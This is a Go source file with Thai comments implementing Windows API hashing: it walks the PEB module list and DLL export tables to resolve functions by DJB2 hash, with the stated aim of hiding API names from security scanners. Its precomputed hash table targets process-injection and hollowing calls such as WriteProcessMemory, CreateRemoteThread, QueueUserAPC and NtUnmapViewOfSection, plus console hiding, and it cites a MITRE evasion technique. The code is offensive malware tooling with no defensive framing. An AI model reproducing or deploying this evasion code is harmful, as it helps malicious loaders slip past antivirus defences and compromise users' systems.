package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// API Hashing — Walk PEB Export Table แทน LoadLibrary/GetProcAddress
//
// ทำงานยังไง:
//   แทนที่จะเรียก:
//     kernel32 := LoadLibrary("kernel32.dll")    ← string "kernel32.dll" โดน detect
//     VirtualAlloc := GetProcAddress(kernel32, "VirtualAlloc") ← string โดน detect
//
//   เปลี่ยนเป็น:
//     1. Walk PEB → InMemoryOrderModuleList (list ของ DLL ที่โหลดอยู่)
//     2. หา DLL โดยเทียบ hash ของชื่อ (DJB2)
//     3. Walk Export Directory ของ DLL นั้น
//     4. หา function โดยเทียบ hash ของชื่อ
//
//   ผลลัพธ์:
//     ✅ ไม่มี string "kernel32.dll" ใน binary
//     ✅ ไม่มี string "VirtualAlloc" ใน binary
//     ✅ Import Table ดูปกติ (ไม่มี Win32 API โดยตรง)
//
// MITRE ATT&CK: T1027.007 (Dynamic API Resolution)

// --- PEB/LDR Structures ---
// ต้องนิยามเองเพราะ Go ไม่มี built-in

type unicodeString struct {
	Length        uint16
	MaximumLength uint16
	_             [4]byte // padding
	Buffer        *uint16
}

type listEntry struct {
	Flink *listEntry
	Blink *listEntry
}

// LDR_DATA_TABLE_ENTRY — entry ใน module list ของ PEB
type ldrDataTableEntry struct {
	InLoadOrderLinks           listEntry
	InMemoryOrderLinks         listEntry
	InInitializationOrderLinks listEntry
	DllBase                    uintptr
	EntryPoint                 uintptr
	SizeOfImage                uint32
	_                          [4]byte // padding
	FullDllName                unicodeString
	BaseDllName                unicodeString
}

// PEB_LDR_DATA
type pebLdrData struct {
	Length                          uint32
	Initialized                     uint32
	SsHandle                        uintptr
	InLoadOrderModuleList           listEntry
	InMemoryOrderModuleList         listEntry
	InInitializationOrderModuleList listEntry
}

// IMAGE_EXPORT_DIRECTORY
type imageExportDirectory struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

// --- Hash Functions ---

// djb2Hash — hash function ที่ใช้ทั่วไปใน malware dev
func djb2Hash(s string) uint32 {
	var hash uint32 = 5381
	for _, c := range s {
		hash = ((hash << 5) + hash) + uint32(c)
	}
	return hash
}

// djb2HashW — DJB2 สำหรับ Unicode string (สำหรับ module name ใน PEB)
func djb2HashW(buf *uint16, length int) uint32 {
	var hash uint32 = 5381
	slice := unsafe.Slice(buf, length/2)
	for _, c := range slice {
		// Lowercase (DLL name บน Windows ไม่ case-sensitive)
		ch := c
		if ch >= 'A' && ch <= 'Z' {
			ch += 32
		}
		hash = ((hash << 5) + hash) + uint32(ch)
	}
	return hash
}

// --- PEB Walking ---

// getPEB — ดึง address ของ PEB จาก GS register
// ใน Windows x64: GS:[0x60] = address ของ PEB
//
//go:nosplit
func getPEB() uintptr

// getModuleByHash — หา base address ของ DLL จาก hash ของชื่อ
// Walk InMemoryOrderModuleList ใน PEB
func getModuleByHash(dllHash uint32) uintptr {
	peb := getPEB()
	if peb == 0 {
		return 0
	}

	// PEB+0x18 = Ldr (pointer to PEB_LDR_DATA)
	ldrAddr := *(*uintptr)(unsafe.Pointer(peb + 0x18))
	ldr := (*pebLdrData)(unsafe.Pointer(ldrAddr))

	// InMemoryOrderModuleList.Flink = first entry
	listHead := &ldr.InMemoryOrderModuleList
	current := listHead.Flink

	for current != listHead {
		// LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks อยู่ที่ offset 0x10 ใน struct
		// ดังนั้น ต้อง subtract 0x10 เพื่อได้ base ของ LDR_DATA_TABLE_ENTRY
		entry := (*ldrDataTableEntry)(unsafe.Pointer(uintptr(unsafe.Pointer(current)) - 0x10))

		if entry.DllBase != 0 && entry.BaseDllName.Buffer != nil {
			nameLen := int(entry.BaseDllName.Length)
			nameHash := djb2HashW(entry.BaseDllName.Buffer, nameLen)

			if nameHash == dllHash {
				return entry.DllBase
			}
		}

		current = current.Flink
	}

	return 0
}

// getProcByHash — หา address ของ function จาก DLL base + function hash
// Walk Export Directory ของ DLL
func getProcByHash(moduleBase uintptr, funcHash uint32) uintptr {
	if moduleBase == 0 {
		return 0
	}

	// Parse DOS Header → PE Header
	dosHeader := moduleBase
	eLfanew := *(*uint32)(unsafe.Pointer(dosHeader + 0x3C))
	peHeader := moduleBase + uintptr(eLfanew)

	// Optional Header → Export Directory RVA
	// PE+0x88 = DataDirectory[0].VirtualAddress (Export Directory)
	exportDirRVA := *(*uint32)(unsafe.Pointer(peHeader + 0x88))
	if exportDirRVA == 0 {
		return 0
	}

	exportDir := (*imageExportDirectory)(unsafe.Pointer(moduleBase + uintptr(exportDirRVA)))

	numberOfNames := exportDir.NumberOfNames
	addrOfNames := moduleBase + uintptr(exportDir.AddressOfNames)
	addrOfFuncs := moduleBase + uintptr(exportDir.AddressOfFunctions)
	addrOfOrds := moduleBase + uintptr(exportDir.AddressOfNameOrdinals)

	// Walk export names
	for i := uint32(0); i < numberOfNames; i++ {
		// ดึง RVA ของ function name
		nameRVA := *(*uint32)(unsafe.Pointer(addrOfNames + uintptr(i*4)))
		nameAddr := moduleBase + uintptr(nameRVA)

		// อ่าน function name (null-terminated ASCII)
		funcName := readCString(nameAddr)

		// เทียบ hash
		if djb2Hash(funcName) == funcHash {
			// ดึง ordinal
			ordinal := *(*uint16)(unsafe.Pointer(addrOfOrds + uintptr(i*2)))
			// ดึง function RVA
			funcRVA := *(*uint32)(unsafe.Pointer(addrOfFuncs + uintptr(ordinal*4)))
			return moduleBase + uintptr(funcRVA)
		}
	}

	return 0
}

// readCString — อ่าน null-terminated C string จาก address
func readCString(addr uintptr) string {
	var result []byte
	for {
		b := *(*byte)(unsafe.Pointer(addr))
		if b == 0 {
			break
		}
		result = append(result, b)
		addr++
	}
	return string(result)
}

// --- Pre-computed Hashes ---
// สร้างจาก djb2Hash() ล่วงหน้า ไม่ต้องมี string ใน binary

// DLL Hashes (lowercase เพราะ djb2HashW lowercase ก่อน hash)
const (
	hashKernel32 = uint32(0x6DDB9555) // djb2("kernel32.dll") lowercase
	hashNtdll    = uint32(0x3CFA685D) // djb2("ntdll.dll") lowercase
	hashUser32   = uint32(0x63C84283) // djb2("user32.dll") lowercase
)

// Function Hashes
const (
	hashVirtualAlloc        = uint32(0x097BC257)
	hashVirtualAllocEx      = uint32(0xE553A458)
	hashVirtualProtect      = uint32(0x844FF18D)
	hashVirtualProtectEx    = uint32(0x5B5DB3B7)
	hashVirtualFree         = uint32(0x30633AC5)
	hashWriteProcessMemory  = uint32(0xD83D6AA1)
	hashCreateRemoteThread  = uint32(0x72BD9CDD)
	hashOpenProcess         = uint32(0x40B518F0)
	hashCreateProcessW      = uint32(0x16B3FE72)
	hashResumeThread        = uint32(0x9E4A3F88)
	hashQueueUserAPC        = uint32(0x7E04B70B)
	hashCreateThread        = uint32(0x835E515E)
	hashWaitForSingleObject = uint32(0xDF7835C3)
	hashGetConsoleWindow    = uint32(0xD2573629)
	hashShowWindow          = uint32(0xE8B6B015)
	hashNtUnmapViewSection  = uint32(0x2EAB42E1)
)

// --- High-level API Wrapper ---

// getAPIByHash — wrapper หลักสำหรับ resolve function address
// ใช้ PEB walking + export table hashing
func getAPIByHash(dllName string, hash uint32) uintptr {
	// Map DLL name → hash (ยังต้องรับ string เพื่อ backward compat)
	// แต่ใน production ควรส่ง DLL hash แทน string
	var dllHash uint32
	switch dllName {
	case "kernel32.dll":
		dllHash = hashKernel32
	case "ntdll.dll":
		dllHash = hashNtdll
	case "user32.dll":
		dllHash = hashUser32
	default:
		// Fallback: hash ชื่อที่ส่งมา
		dllHash = djb2Hash(dllName)
	}

	moduleBase := getModuleByHash(dllHash)
	if moduleBase == 0 {
		// Fallback: LoadDLL ปกติถ้า PEB walk ล้มเหลว
		dll, err := windows.LoadDLL(dllName)
		if err != nil || dll == nil {
			return 0
		}
		return getProcByHash(uintptr(dll.Handle), hash)
	}

	return getProcByHash(moduleBase, hash)
}

// printHashTable — แสดง hash ของ DLL/function ที่ใช้ (debug)
func printHashTable() {
	tests := []struct {
		name string
		hash uint32
	}{
		{"kernel32.dll", hashKernel32},
		{"VirtualAlloc", hashVirtualAlloc},
		{"VirtualAllocEx", hashVirtualAllocEx},
		{"CreateRemoteThread", hashCreateRemoteThread},
	}

	fmt.Println("\n[*] API Hash Table:")
	for _, t := range tests {
		addr := getAPIByHash("kernel32.dll", t.hash)
		fmt.Printf("    %-25s → hash=0x%08X addr=0x%X\n", t.name, t.hash, addr)
	}
}
